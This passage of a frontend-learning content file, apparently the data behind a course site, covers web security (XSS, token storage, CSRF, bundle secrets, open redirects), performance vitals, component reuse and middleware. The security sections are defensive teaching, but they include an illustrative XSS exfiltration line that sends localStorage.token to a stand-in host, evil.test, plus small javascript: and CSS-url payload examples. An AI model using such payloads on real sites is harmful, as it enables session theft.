              '**Why bother, in money.** Trust dies after one leak. Equifax (2017) and a GDPR-scale BA fine are the slides. Security is not “the security team’s ticket.” You write the code that handles data.',
              '**Threat model, not vibes.** For each slice: what data can be stolen here, what are the entry points (forms, query, APIs), what is the weakest door (`innerHTML`, concatenated SQL, an old admin), what would hurt most (dump the DB vs deface the homepage), what defense is worth the tax.',
              '**Three slices.** Frontend = scripts in the tab. Transition = MITM, HTTPS, CORS, CSRF. Backend = SQLi, authz, rate limits, how you store secrets. Different vectors. Different locks.',
            ],
          },
          {
            type: 'table',
            columns: ['Slice', 'Attacker question', 'This map', 'The other map'],
            rows: [
              ['Browser', 'Can their string become my program?', 'Studio + XSS + tokens', 'HttpOnly / SameSite cookies'],
              ['Wire', 'Can they read or forge the hop?', 'HTTPS, HSTS, CORS, CSRF below', 'TLS, headers, cookie flags'],
              ['Server', 'Can they skip the SPA?', 'Never trust the client. Recalculate prices.', '**22 · Security** — SQLi, BOLA, hashing'],
            ],
          },
          { type: 'quote', text: 'If I were an attacker, how would I break this — at this layer — today.' },
        ],
      },
      {
        heading: '9. Validation, sanitization, escaping — three different jobs',
        blocks: [
          { type: 'p', text: 'This is the part of Dimma’s video most people mash. **They are not synonyms.** Get this wrong and you “sanitize” a name field into mush, or you escape once at insert and corrupt every later context.' },
          {
            type: 'table',
            columns: ['Job', 'Asks', 'Does', 'When'],
            rows: [
              ['**Validation**', 'Is this *correct* for the product?', 'Reject. Do not “fix.” Email shape, age 0–120, length cap.', 'Early. Client = UX. Server = **mandatory** (curl skips your form).'],
              ['**Sanitization**', 'How do I keep useful markup and drop the gun?', 'Transform. DOMPurify / `sanitize-html`. Script gone, `<b>` stays.', '**Only** when users need HTML or markdown. Not for a username.'],
              ['**Escaping**', 'How do I *display* this in *this* language?', 'Encode at the **sink**. `<` → `&lt;` in HTML. Parameters in SQL.', 'Last moment, for that context. HTML ≠ SQL ≠ JS ≠ URL.'],
            ],
          },
          { type: 'p', text: 'His mantra: **validate early, escape late, sanitize only for rich content.** Client validation is optional for security (an attacker uses Postman). It is useful for UX and to stop honest junk. Server validation is not optional. Send the write over **HTTPS** so a MITM cannot rewrite the body after your pretty Vue checks.' },
          { type: 'h3', text: 'Store the original. Sanitize when you paint.' },
          { type: 'p', text: 'If you sanitize on **write** and throw away the raw string, you cannot re-sanitize when DOMPurify ships a patch, you cannot export to PDF/email with different rules, and you cannot undo an over-strip. Store **raw**. Sanitize (or escape) at **read/render**. Optional optimization: store raw **and** a pre-sanitized column — update both on edit. Never replace raw with the cleaned copy as the only memory of what they typed.' },
          { type: 'h3', text: 'Sanitize on the client even if the backend already did' },
          {
            type: 'ul',
            items: [
              'SQL injection (or a bad migration) planted a script in the table after you “cleaned” writes.',
              'A **third-party API** handed you HTML you do not control.',
              '**Legacy rows** from before you had a sanitizer.',
              '**MITM** (if you skipped HTTPS) rewrote the JSON on the way to the tab.',
            ],
          },
          { type: 'p', text: 'For **plain text** (name, title): `textContent` / `{{ name }}` / `{name}` — the framework already escapes. For **formatted HTML**: DOMPurify **immediately before** the DOM, even if the server claims it is clean. `dangerouslySetInnerHTML` / `v-html` means you accepted the gun. The name is not a joke.' },
          {
            type: 'kid',
            items: [
              'Validation = “this is not a real lunch order” → send it back.',
              'Sanitization = “keep the sandwich, throw the razor in the bread.”',
              'Escaping = “write the order on the chalkboard so the kitchen reads it as words, not as a recipe.”',
              'Keep the original ticket in the drawer. You may need it tomorrow in a different kitchen.',
            ],
          },
        ],
      },
      {
        heading: '10. The machine is the attacker’s',
        blocks: [
          { type: 'p', text: 'Backend security asks “where did I assume?” Frontend security adds: **the runtime is on their desk.** They have DevTools. They change `userId` in the JSON. They replay the request without your `if (isAdmin)` in Vue. They install a browser extension. They are not using your CSS.' },
          {
            type: 'ul',
            items: [
              'They will only click our buttons.',
              'They cannot see the admin link if we `v-if` it.',
              'The JWT in localStorage is fine — it is “our” tab.',
              'Markdown / comments / names are “just text.”',
            ],
          },
          { type: 'p', text: 'Every one of those is false. The useful paranoia: **what can a script on this origin do, and what can a raw HTTP client do?** Those are the two attackers. XSS is the first. The network tab is the second.' },
          {
            type: 'kid',
            items: [
              'You put a velvet rope in front of the office. They walked around it. The rope was for manners.',
              'You also taped the spare key to the glass door. That is localStorage.',
            ],
          },
        ],
      },
      {
        heading: '11. XSS — user text that the DOM treats as code',
        blocks: [
          { type: 'p', text: '**Cross-site scripting:** you take a string from a user (comment, name, search query, URL param) and **insert it into HTML**. The browser’s HTML parser sees `<script>` or `<img onerror>` and **runs it**. The script’s origin is **your site**. It can read `localStorage`, make fetch calls as the user, rewrite the page into a login clone.' },
          {
            type: 'table',
            columns: ['Kind', 'When it runs', 'Why it hurts'],
            rows: [
              ['Stored', 'Saved on the server, shown to everyone later', 'One payload, every viewer.'],
              ['Reflected', 'Bounces off a query param into the page', 'A malicious link. One victim per click.'],
              ['DOM-based', 'JS reads `location` / `innerHTML` and writes the DOM', 'No server needed. Your client code is the sink.'],
            ],
          },
          { type: 'p', text: '**Stored XSS** is the worst of the three because it is **persistent**, hits **every viewer**, and can sit in the DB for months. Dimma’s diagram is a **two-door failure**: (1) the form did not validate/escape on the way in, (2) the server saved the script as a comment, (3) a later page used `innerHTML`. Front **and** back both said yes. Close either door and stored XSS dies. Close **both**.' },
          { type: 'p', text: '**Reflected:** the payload rides a query string, the error page echoes it, one victim per click. Escape that echo. CSP as net. **DOM-based:** the payload lives in `location.hash`. The **server never sees it** (fragments are not sent). Your JS does `el.innerHTML = location.hash`. Server logs look clean. Escape or — better — `textContent`. Same three types as **18 · XSS**.' },
          {
            type: 'pre',
            lines: `// data — characters in a text node
el.textContent = comment

// program — parser, then maybe a handler
el.innerHTML = comment

// the only honest API name
element.innerHTML = userInput  // means: run this as my origin`,
          },
          { type: 'p', text: 'Fix: **text by default**. If you must allow markup, **sanitize for that context** (allowlist of tags/attrs, a real library). Then **CSP** as a net: no inline scripts, scripts only from your origin. CSP is not the fix. It is the last layer after you already failed to keep data as data. Same shape as SQL parameters plus a DML-only DB user on the backend map.' },
        ],
      },
      {
        heading: '12. Tokens — if JS can read it, XSS can send it',
        blocks: [
          { type: 'p', text: 'A session id or access token in **`localStorage` / `sessionStorage`** is a string in a JS-visible locker. XSS is `fetch("https://evil.test/steal?t=" + localStorage.token)`. You cannot outsmart that with “our code would never.” The attacker’s code is also “on our origin.”' },
          { type: 'p', text: '**HttpOnly cookie:** the browser attaches it to requests to your origin. JavaScript **cannot** `document.cookie` it. XSS still exists (it can still fire `fetch("/api/me")` as the user — **session riding**). It cannot **export** the raw token as easily to another origin. That is a smaller blast radius, not immunity.' },
          {
            type: 'ul',
            items: [
              '**HttpOnly** — JS cannot read.',
              '**Secure** — HTTPS only.',
              '**SameSite=Lax or Strict** — starve CSRF on modern browsers. See below.',
              '**Path / Domain** — do not sprinkle the cookie on every subdomain unless you mean to.',
            ],
          },
          { type: 'p', text: 'Bearer in `Authorization` from memory (not storage) dies on refresh — that is why people stash it, and why they get burned. Short-lived access + HttpOnly refresh is the boring adult pattern. Open Backend · Auth / Security for the server half.' },
        ],
      },
      {
        heading: '13. CSRF — the browser is too helpful with cookies',
        blocks: [
          { type: 'p', text: 'If the session lives in a cookie, the browser **attaches it** to requests to that origin even when the **page** is `evil.test`. Classic: a form or image on the other site hits `POST https://shop.test/transfer`. Your API sees a logged-in cookie. Dimma’s walkthrough: phishing email → evil page → hidden form → bank sees a real session. The victim clicked a prize. The browser volunteered the cookie.' },
          { type: 'p', text: '**CORS is not CSRF protection.** CORS is about whether **JavaScript on origin A may read the response** from origin B. CSRF is about whether origin A can **cause a write** using the user’s cookies. A simple `<form POST>` is grandfathered: it **hits the server** even cross-origin; the browser may only hide the response from JS. Destructive `fetch` + JSON often gets a **preflight** and dies first. Do not point at `Access-Control-Allow-Origin` and call CSRF done. Postman has no CORS at all.' },
          {
            type: 'table',
            columns: ['Defense', 'How', 'Catch'],
            rows: [
              ['**SameSite**', 'Browser withholds the cookie on cross-site writes.', '**Lax** = links still log you in (email). **Strict** = even a link arrives logged out. **None** = always send (needs Secure). Lax is the usual default.'],
              ['**CSRF token**', 'Random value the attacker cannot read. Hidden field or `X-CSRF-Token`. Not auto-attached like a cookie.', '**XSS can steal it** from the DOM / JS memory / a non-HttpOnly double-submit cookie. Fix XSS first.'],
              ['**Origin / Referer**', 'Server allowlists your origin.', 'Privacy tools strip headers. Block when present-and-wrong; do not rely on them alone.'],
              ['**Re-auth / OTP**', 'Password or SMS before the wire transfer.', 'Strong. Ugly UX. Reserve for money and email-change.'],
            ],
          },
          { type: 'p', text: '**Client-side CSRF:** no injected script. Your **own** JS reads a query param and builds a `POST`. The attacker mailed a link with `?action=delete`. Your code “helpfully” includes the real CSRF token. Defense: URL params are for **reads** (search, filters). Do not let them pick **state-changing** endpoints.' },
          { type: 'p', text: '**JSON APIs** that refuse form-encoding and require a custom header also fail simple `<form>` CSRF — other origins cannot set that header without CORS saying yes. Combine. Dimma’s rule: **cookies for auth → SameSite Lax/Strict first, then tokens, then Origin.** No cookies (Bearer in memory) lowers classic CSRF and raises XSS-theft — **12 · Tokens**.' },
        ],
      },
      {
        heading: '14. The UI is not authorization',
        blocks: [
          { type: 'p', text: '`v-if="user.role === \'admin\'"` hides a button. It does not hide `DELETE /api/users/17`. The attacker never needed the button. They needed the URL, which they saw in the network tab yesterday, or guessed.' },
          { type: 'p', text: 'Frontend auth is **UX**: show the right chrome, send the cookie, handle 401 by redirecting to login, handle 403 with a boring “no.” **Authn and Authz are backend.** Ownership in the query. Default deny. This sentence is duplicated on purpose from the backend map. Teams still ship the opposite: a secret `/admin` route and an API that trusts the SPA.' },
          {
            type: 'pre',
            lines: `// not a lock
if (role !== "admin") hideDeleteButton()

// the lock (server)
DELETE /users/17  →  401 / 403 / 404
never 204 because the SPA omitted the button`,
          },
        ],
      },
      {
        heading: '15. Secrets do not belong in the bundle',
        blocks: [
          { type: 'p', text: '`VITE_STRIPE_SECRET`, `NUXT_PUBLIC_ADMIN_KEY`, a Mapbox **secret**, an AWS key with `s3:*` — if it went into client JS, it is **public**. `NUXT_PUBLIC_*` and `VITE_*` are **not** vaults. They are billboards. Anything the browser needs (a publishable Stripe key, a public Mapbox token with URL restrictions) must be **safe to leak**. The rest stays on the server.' },
          { type: 'p', text: 'Source maps in production plus a secret in an unminified chunk is a care package. Disable public maps if you must ship mistakes; better: do not ship the secret.' },
        ],
      },
      {
        heading: '16. Other glass-door holes',
        blocks: [
          {
            type: 'ul',
            items: [
              '**Open redirects** — `?next=https://evil.test` after login. Allowlist paths, not arbitrary URLs.',
              '**postMessage** — check `event.origin`. `*` is an open window.',
              '**iframe / clickjacking** — `X-Frame-Options` / CSP `frame-ancestors`. Do not let your app be a transparent button on their page.',
              '**Third-party scripts / supply chain** — analytics, chat, maps. If `cdn.analytics.test/track.js` is poisoned, every site that loads it is poisoned. **Minimize** scripts. **SRI** (`integrity=` hash) so a swapped file will not run. CSP to cap what they may do. GitHub Dependabot / similar for npm. Dimma: you can write perfect app code and still lose through a trusted `<script src>`.',
              '**Mixed content** — HTTPS page, HTTP script. Browsers block it. Do not un-block it.',
            ],
          },
        ],
      },
      {
        heading: '17. Quick map',
        blocks: [
          {
            type: 'table',
            columns: ['Hole', 'Assumption', 'Close it'],
            rows: [
              ['XSS', 'Comments are text', 'textContent / default interpolations. Sanitize if HTML. CSP last.'],
              ['Token theft', 'Storage is private', 'HttpOnly cookie. Never localStorage for session.'],
              ['CSRF', 'Only our page sends cookies', 'SameSite. Token or custom header. CORS ≠ auth. CORS ≠ CSRF.'],
              ['Hidden admin', 'No button = no API', 'Server AuthZ. 401/403/404.'],
              ['Bundle secret', 'Minify hides it', 'If the browser needs it, it is public. Restrict the key.'],
              ['Redirect', 'next= is a path', 'Allowlist. Same origin.'],
              ['postMessage', 'Messages are from us', 'Check origin. Do not `*`.'],
            ],
          },
          {
            type: 'callout',
            lines: [
              '**Watch.** [Five pillars](https://youtu.be/kCRYqHPZVzQ) (rooms) · [Dimma — front, wire, back](https://youtu.be/-GfSbk_VqSk) (architecture + validate/sanitize/escape).',
              '**Validate early. Escape late. Sanitize only for rich text.** Store raw. Paint safe.',
              '**Data stays data.** **JS-visible tokens are XSS-visible tokens.** **The network tab is the client.**',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'xss',
    n: 18,
    title: 'XSS in One Page: Sinks, Sources, and Why Frameworks Still Slip',
    label: 'XSS',
    cluster: 'lock',
    x: 800,
    y: 620,
    gist: 'A source is where the string comes from. A sink is where it becomes HTML or JS. XSS is a path from source to sink with no encoding. Frameworks block the common sinks; href, style, and markdown still leak.',
    remember: [
      'Sources: URL, storage, postMessage, server HTML, user fields.',
      'Sinks: innerHTML, document.write, eval, href=javascript:, CSS url(), v-html.',
      'Sanitize for the sink you have. HTML sanitizer does not make javascript: URLs safe in href.',
    ],
    sections: [
      {
        heading: '1. href and style are sinks too',
        blocks: [
          { type: 'p', text: '`{{ name }}` is safe. `:href="userLink"` is not, if `userLink` is `javascript:steal()`. `style="{{ userColor }}"` can be `url(https://evil/track)`. Encode for **attribute**, **URL**, or **CSS** — they are different languages, same as SQL vs HTML on the backend map.' },
          { type: 'p', text: 'Open **17 · Security** and run the wall. This node is the leftover sinks after “just don’t use innerHTML.”' },
        ],
      },
    ],
  },
  {
    id: 'tokens',
    n: 19,
    title: 'Tokens in the Browser: Memory, Cookie, or Mistake',
    label: 'Tokens',
    cluster: 'lock',
    x: 700,
    y: 760,
    gist: 'Access tokens, refresh tokens, CSRF tokens, session ids — different jobs. The mistake is treating them all as “put in localStorage.” The job decides the drawer.',
    remember: [
      'Session / refresh: HttpOnly cookie. Access: short, memory, or also cookie.',
      'CSRF token: readable by JS on purpose (double-submit) or same-site cookie strategy.',
      'Never put a token in the URL. Logs, Referer, screenshots.',
    ],
  },
  {
    id: 'perf',
    n: 20,
    title: 'How to Improve Web Performance: LCP, INP, CLS, and the Cost of JavaScript',
    label: 'Perf',
    cluster: 'keep',
    x: 1040,
    y: 580,
    gist: 'Users feel three things: how fast the main picture arrives, how fast a click paints, and whether the layout jumps. Google named those LCP, INP, and CLS. You improve them by measuring field data, then cutting the wait in each subpart — not by guessing in Lighthouse on a MacBook.',
    remember: [
      'Field first: p75. LCP ≤ 2.5s. INP ≤ 200ms. CLS ≤ 0.1. Lab is a flashlight, not the road.',
      'LCP has four subparts (TTFB, resource delay, download, render delay). Fix the fat one.',
      'Byte for byte, JavaScript is the most expensive resource. Ship less. Break long tasks. Open 21 · Bundles.',
    ],
    sections: [
      {
        heading: '1. Name the feeling, then measure it',
        blocks: [
          { type: 'p', text: 'Performance is not “the site feels slow.” It is three user-centric questions, which [Web Vitals (web.dev)](https://web.dev/articles/vitals) turned into the **Core Web Vitals**. Measure at the **75th percentile**, mobile and desktop separate. A page “passes” only if all three are good for most real visits — not for your laptop on office Wi-Fi.' },
          {
            type: 'table',
            columns: ['Vital', 'What the human feels', 'Good'],
            rows: [
              ['**LCP** (Largest Contentful Paint)', 'When did the main picture (hero, heading, product shot) actually show?', '≤ 2.5s'],
              ['**INP** (Interaction to Next Paint)', 'After I click / tap / type, when does the next frame paint?', '≤ 200ms'],
              ['**CLS** (Cumulative Layout Shift)', 'Did the page shove the button I was about to hit?', '≤ 0.1'],
            ],
          },
          { type: 'p', text: 'INP replaced First Input Delay as a Core Web Vital in March 2024. FID only timed the **first** click’s delay before the handler started. INP times **every** click/tap/key through the whole visit and reports a high percentile of the worst ones. A dashboard that is fast on first paint and dead after you open a modal now fails honestly.' },
          { type: 'p', text: '**Field vs lab.** Chrome UX Report (CrUX), Search Console, PageSpeed Insights “real users,” and the `web-vitals` library are **field**. Lighthouse and a Performance recording on your phone are **lab**. Lab is how you debug. Field is how you know. If they disagree, trust field and reproduce it (slow CPU, slow 4G, cache cold).' },
          {
            type: 'kid',
            items: [
              'LCP = when the big poster on the wall actually appears.',
              'INP = how long after you knock until someone opens the door.',
              'CLS = someone moving the doorknob while your hand is in the air.',
            ],
          },
        ],
      },
      {
        heading: '2. LCP — four waits that add up to one number',
        blocks: [
          { type: 'p', text: '[Optimize LCP (web.dev)](https://web.dev/articles/optimize-lcp) (Philip Walton, Barry Pollard) is the method: do not “compress images and hope.” Split LCP into **four subparts with no overlap**. They sum to LCP. Find the fat one.' },
          {
            type: 'table',
            columns: ['Subpart', 'Clock', 'Typical fix'],
            rows: [
              ['**TTFB**', 'Click → first byte of HTML', 'Closer server / CDN, fewer redirects, cache the document, faster origin.'],
              ['**Resource load delay**', 'HTML arrived → browser **starts** the LCP image/font', 'Put the LCP URL in the HTML. `fetchpriority="high"`. Preload. Do not hide the hero behind JS.'],
              ['**Resource load duration**', 'Download of that resource', 'Right size, AVIF/WebP, CDN. Do not inflate with a 4000px PNG.'],
              ['**Element render delay**', 'Bytes here → pixels', 'Do not block paint with a huge JS bundle. HTML for the hero. Fonts that do not wait forever.'],
            ],
          },
          { type: 'p', text: 'A trap they document: shrink the image and **LCP does not move** — the time just **slides** into render delay because something else (usually JS) still holds the paint. You have to watch all four. The LCP resource should **start as early as the HTML allows** and the element should paint **as soon as those bytes exist**.' },
          { type: 'quote', text: 'If the hero is created in JavaScript, you already chose a slow LCP. The HTML never knew the picture existed.' },
        ],
      },
      {
        heading: '3. INP — the click is three clocks',
        blocks: [
          { type: 'p', text: 'INP is **input delay + processing + presentation delay**. Input delay is “the main thread was busy with something else.” Processing is your handler. Presentation is style/layout/paint of the next frame.' },
          {
            type: 'ul',
            items: [
              '**Break long tasks.** Anything over ~50ms on the main thread is a closed door. `scheduler.yield()` (where it exists) or a `setTimeout(0)` chunk so the browser can take the click in between.',
              '**Do less in the click.** Update state, paint, then fetch. Do not JSON-parse a megabyte inside the handler. Workers exist for CPU that is not the picture.',
              '**Smaller DOM.** A 10,000-node table makes every click restyle the world. Virtualize lists. Open **4 · Render**.',
              '**Third parties.** Analytics and chat widgets steal the thread. Load them after interaction, or isolate them. They are not free because they are `<script async>`.',
            ],
          },
          { type: 'p', text: 'This is the same physics as **5 · Events**: your handler is a function on **one** thread. INP is the stopwatch on that fact.' },
        ],
      },
      {
        heading: '4. CLS — reserve the box',
        blocks: [
          { type: 'p', text: 'Layout shift is almost always “I painted, then something bigger arrived.” Images without **width/height** (or aspect-ratio). Fonts that swap from fallback to web font. Ads and embeds that inflate. Banners that push content down.' },
          {
            type: 'ul',
            items: [
              'Always size media in HTML/CSS **before** the bytes arrive.',
              '`font-display: optional` or a fallback with a similar metric so the swap does not shove lines.',
              'Reserve space for cookie bars and late-loaded cards. Do not insert above the fold after first paint.',
            ],
          },
        ],
      },
      {
        heading: '5. JavaScript is the expensive calorie',
        blocks: [
          { type: 'p', text: 'Addy Osmani’s [The Cost of JavaScript (2023)](https://www.youtube.com/watch?v=ZKH3DLT4BKw) is the talk to watch: **byte for byte, JS is the most expensive resource on the page**. CSS mostly becomes pixels. Images decode. JS is **download + parse + compile + execute on the CPU you do not have** — a mid-range Android or a cheap Windows laptop, not your M-series. Flagships race ahead; the next billion users buy on price.' },
          {
            type: 'ul',
            items: [
              '**Ship less.** Default-importing a date library for `format(price)` is how a button costs 80KB. Open **21 · Bundles**.',
              '**Split by route, then by “opened this widget.”** The chart library should not parse on a page that never charts.',
              '**HTML for the first picture.** Client-only render makes TTFB→FCP a JS tax. That tax shows up in LCP and INP.',
              '**Develop on a slow phone** (or Chrome CPU 4× / 6× throttle) or you will ship a site that only you can use.',
            ],
          },
          { type: 'quote', text: 'The cheapest JavaScript is JavaScript you did not ship.' },
        ],
      },
      {
        heading: '6. A working order',
        blocks: [
          {
            type: 'ul',
            items: [
              '1. Look at field LCP / INP / CLS (PageSpeed Insights, Search Console, or `web-vitals`). Pick the red one.',
              '2. For **LCP**: identify the LCP element in DevTools Performance. Split the four subparts. Fix the fat one.',
              '3. For **INP**: record a click. Find the long task. Cut JS, yield, or move work off the handler.',
              '4. For **CLS**: screenshot the shift. Give that box a size.',
              '5. Re-measure **field**. Lab green + field red means you did not reproduce the user.',
            ],
          },
          {
            type: 'callout',
            lines: [
              '**Read / watch.** [Web Vitals](https://web.dev/articles/vitals) · [Optimize LCP](https://web.dev/articles/optimize-lcp) · [The Cost of JavaScript (2023)](https://www.youtube.com/watch?v=ZKH3DLT4BKw).',
              'This node is the **how**. **21 · Bundles** is the calorie label on what you shipped.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'bundles',
    n: 21,
    title: 'Bundles: What Actually Arrives in the Tab',
    label: 'Bundles',
    cluster: 'keep',
    x: 1220,
    y: 600,
    gist: 'A bundler graphs imports, tree-shakes, splits, minifies. The browser downloads that graph. Your 3KB component is not 3KB if it pulls a date library that pulls a locale that pulls the sun.',
    remember: [
      'Look at the analyzed bundle, not the source file size.',
      'Default import of a large lib is how a settings icon costs 80KB.',
      'Source maps for you. Not necessarily for the public internet.',
    ],
  },
  {
    id: 'testing',
    n: 22,
    title: 'Testing the Frontend: The Click That Must Keep Working',
    label: 'Testing',
    cluster: 'keep',
    x: 1180,
    y: 760,
    gist: 'Unit the pure bits. Component-test the boundary. E2E the money path. Snapshot soup is how you lock in the haunted DOM. Test what the user does, plus the security you claimed.',
    remember: [
      'Add to cart updates the badge — that is a state test. 11 · State made it possible.',
      'Member cannot DELETE /admin in the API — that is not a Vue test. Still your job to care.',
      'If you only screenshot, you only know it looked fine once.',
    ],
  },
  {
    id: 'reusable',
    n: 23,
    title: 'Reusable UI: Composition, Slots, and Why Another Prop Is Usually Wrong',
    label: 'Reusable',
    cluster: 'pieces',
    x: 900,
    y: 160,
    gist: 'Reuse is not copy-paste with a flag. It is letting the caller arrange the picture (slots / children) while you keep the behavior. Inheritance and a 40-prop “flexible” card are how reusable becomes unusable.',
    remember: [
      'Compose: children, slots, compound pieces. Do not extend a base class of Button.',
      'A new prop for every layout request is the apropcalypse. Give structure back to the caller.',
      'Reuse functions and composables for non-UI. Reuse components for pictures that actually repeat.',
    ],
    sections: [
      {
        heading: '1. What “reusable” actually means',
        blocks: [
          { type: 'p', text: 'A component is reusable when **someone else can use it without forking it**. That is a smaller claim than “one card to rule every screen.” The React docs said this years ago in [Composition vs Inheritance](https://legacy.reactjs.org/docs/composition-vs-inheritance.html): **pass children (or slots). Do not build a class hierarchy of Dialog → WelcomeDialog → SpecialWelcomeDialog.** Facebook wrote thousands of components and still found no good reason to `extend` a UI class.' },
          { type: 'p', text: 'Vue’s `<slot>`, React’s `children`, Svelte’s `<slot>` / snippets — same first principle. The parent owns the **hole**. The caller owns **what goes in the hole**. You reuse the chrome (padding, focus trap, keyboard). They reuse their content.' },
          {
            type: 'pre',
            lines: `<!-- reusable: the dialog does not know the body -->
<Dialog>
  <slot />   <!-- Vue -->
</Dialog>

<Dialog>{children}</Dialog>   // React

<!-- not reusable: every new screen is a new boolean -->
<Dialog welcome special showPromo />`,
          },
          {
            type: 'kid',
            items: [
              'A picture frame is reusable. A painting with “also maybe a cat, pass `hasCat`” is not a frame.',
              'Hand them the empty frame. Let them put their own drawing in it.',
            ],
          },
        ],
      },
      {
        heading: '2. The apropcalypse',
        blocks: [
          { type: 'p', text: 'Kent C. Dodds named the failure in [Avoid soul-crushing components](https://www.epicreact.dev/soul-crushing-components): each unexpected layout request becomes **one more prop**. `showIcon`, `iconRight`, `footerVariant`, `compact`, `asChild`… The maintainer drowns. The caller still cannot quite get the markup they need, so they add another flag. That is not reuse. That is a configuration file pretending to be a component.' },
          { type: 'p', text: 'The way out is **compound components** — the pattern HTML already uses: `<select>` + `<option>`, `<table>` + `<tr>` + `<td>`. Parent holds shared state. Children are the pieces the caller **arranges**. Tabs / TabList / Tab / TabPanel. You do not pass `tabs={[{label, panel, disabled}]}` and then invent `renderTab` when someone wants a badge on tab 3.' },
          {
            type: 'pre',
            lines: `// rigid — every new layout is a prop
<Tabs items={items} renderExtra={...} />

// compound — the caller composes
<Tabs>
  <TabList>
    <Tab>One</Tab>
    <Tab>Two <Badge>new</Badge></Tab>
  </TabList>
  <TabPanel>…</TabPanel>
</Tabs>`,
          },
          { type: 'p', text: 'Vue does this with named slots (`#header`, `#item="{ row }"`) and provide/inject for the invisible wire. Same idea as React context between compound pieces. If you are not hitting prop explosion, a plain component is enough. Compound APIs are for **structure the author cannot predict**.' },
        ],
      },
      {
        heading: '3. Reuse the right layer',
        blocks: [
          {
            type: 'table',
            columns: ['What repeats', 'Reuse as', 'Not as'],
            rows: [
              ['Markup + behavior (a real Button)', 'A component with a slot for the label', 'A mixin of 14 options'],
              ['Behavior only (format money, useCart)', 'A function / composable', 'A ghost `<FormatMoney>` with no picture'],
              ['One-off page chrome', 'Leave it in the page', 'A `FlexibleHero` used once'],
              ['Look (color, type)', 'Tokens / CSS', 'A `ThemedDiv` wrapper empire'],
            ],
          },
          { type: 'p', text: 'Kent’s other useful brake: **AHA** (Avoid Hasty Abstraction), not blind DRY. Three similar cards that will diverge next week should stay copied until the **fourth** copy proves the shared shape. Premature “design system” is how you get a Button that nobody can use without reading 40 props.' },
        ],
      },
      {
        heading: '4. Quick map',
        blocks: [
          {
            type: 'callout',
            lines: [
              '**Read.** React [Composition vs Inheritance](https://legacy.reactjs.org/docs/composition-vs-inheritance.html) · Kent C. Dodds [soul-crushing components](https://www.epicreact.dev/soul-crushing-components) / [compound components](https://www.epicreact.dev/compound-components-truly-flexible-react-apis-5nu15).',
              '**Slots / children first.** Props for data. Compound pieces when the caller must own the tree.',
              'Open **6 · Components** for the boundary, **7 · Props** for data-down / events-up.',
            ],
          },
        ],
      },
    ],
  },
  {
    id: 'middleware',
    n: 24,
    title: 'Frontend Middleware: The Hallway Before the Page (and Before Fetch)',
    label: 'Middleware',
    cluster: 'pieces',
    x: 740,
    y: 320,
    gist: 'Middleware is still “code in the middle.” On a frontend it sits between a navigation and a page, or between fetch() and the network. Call next (or navigateTo). Skip it and the request hangs. Put product rules here and every screen pays a tax.',
    remember: [
      'Same idea as Backend · Middleware: inspect, stamp, pass, or stop.',
      'Route middleware is a navigation guard. It is UX. The API is still the lock — 17 · Security.',
      'Fetch interceptors are middleware for HTTP from the tab. Server/edge middleware is a different hallway (Nitro / Next edge).',
    ],
    sections: [
      {
        heading: '1. The name is literal — it runs in the middle',
        blocks: [
          { type: 'p', text: 'The best first-principles explainer is still the backend one, said out loud: [Why Every Developer Needs to Understand Middleware](https://www.youtube.com/watch?v=Lb-5ziwsqpc) (the airport metaphor). A request is a passenger. The handler is the flight. **Middleware is security, stamps, and the people who can send you home before you board.** `next()` means “this checkpoint is done.” No `next()` and no response means the passenger stands in the hallway forever.' },
          { type: 'p', text: 'That is Express `function (req, res, next)`. It is also Vue Router `beforeEach`, Nuxt route middleware, Next.js `middleware.ts` at the edge, and an Axios / `$fetch` interceptor. Different runtimes. **Same shape.** The HRMS specimen is **Guards Studio**: Vue `beforeEach` + Axios Bearer + Gin `AuthN` / `RequireResourcePermission`, with the JWT in **localStorage** (`auth_session`) — not a cookie. Open [HRMS · Guards](/insights/notes/hrms/guards).' },
          {
            type: 'pre',
            lines: `navigation / HTTP request
  → middleware 1   // log, locale, auth cookie?
  → middleware 2   // redirect or next()
  → page / handler / network
  → (sometimes middleware on the way out)`,
          },
          {
            type: 'kid',
            items: [
              'A hallway of checkpoints before the classroom.',
              'Each guard can stamp your pass, send you to the office, or wave you through. `next()` is the wave.',
            ],
          },
        ],
      },
      {
        heading: '2. Three hallways on a modern frontend',
        blocks: [
          {
            type: 'table',
            columns: ['Hallway', 'When it runs', 'Typical job'],
            rows: [
              ['**Route middleware** (Nuxt `app/middleware`, Vue `beforeEach`)', 'Before a **page** navigation (SSR first load **and** client clicks)', 'Auth redirect, locale, “are you allowed to see this screen?”'],
              ['**Server / edge middleware** (Nitro `server/middleware`, Next.js `middleware.ts`)', 'Every **HTTP** request to the origin / edge', 'CORS, cookies, A/B, geo redirect. Not Vue. Not `window`.'],
              ['**Fetch interceptor**', 'Around `fetch` / `$fetch` / Axios from the tab', 'Attach Bearer, retry 401, map errors. The client’s hallway to the API.'],
            ],
          },
          { type: 'p', text: '[Nuxt’s own docs](https://nuxt.com/docs/4.x/directory-structure/app/middleware) are blunt: route middleware lives in the **Vue app**. Server middleware lives in **Nitro**. They share a word and **nothing else**. James Ross Jr.’s [Nuxt Middleware and Plugins](https://www.jamesrossjr.com/blog/nuxt-middleware-guide) adds the third confusion: **plugins** run once at startup; they are not navigation guards. Use a plugin to register a library. Use route middleware to allow/deny a page. Use server middleware to stamp every HTTP request.' },
          { type: 'p', text: 'Next.js puts **one** `middleware.ts` at the root, on the Edge Runtime, **before** the route handler. Matchers pick paths. Same airport, different building: it never ships in the JS bundle. That is a feature (small client) and a limit (no Node APIs, no `document`).' },
        ],
      },
      {
        heading: '3. Route middleware is not a lock',
        blocks: [
          { type: 'p', text: 'A Nuxt `defineNuxtRouteMiddleware` that `navigateTo("/login")` when there is no cookie **hides the dashboard**. It does not hide `GET /api/invoices`. Anyone with DevTools still calls the API. That is **17 · Security** and **8 · Routing** again: **guards are UX. Authorization is the server.**' },
          {
            type: 'pre',
            lines: `// UX — fine
if (!loggedIn) return navigateTo("/login")

// not a lock — the invoice API must still 401 / 404
GET /api/invoices/17`,
          },
          { type: 'p', text: 'Use `to` and `from` in the guard (Nuxt warns: `useRoute()` inside middleware is the **wrong** “current” route, because you might abort). Keep it **tiny**. Await only what you must before the picture. Slow middleware is INP and LCP for every navigation — **20 · Perf**.' },
        ],
      },
      {
        heading: '4. Fetch interceptors — middleware you already wrote',
        blocks: [
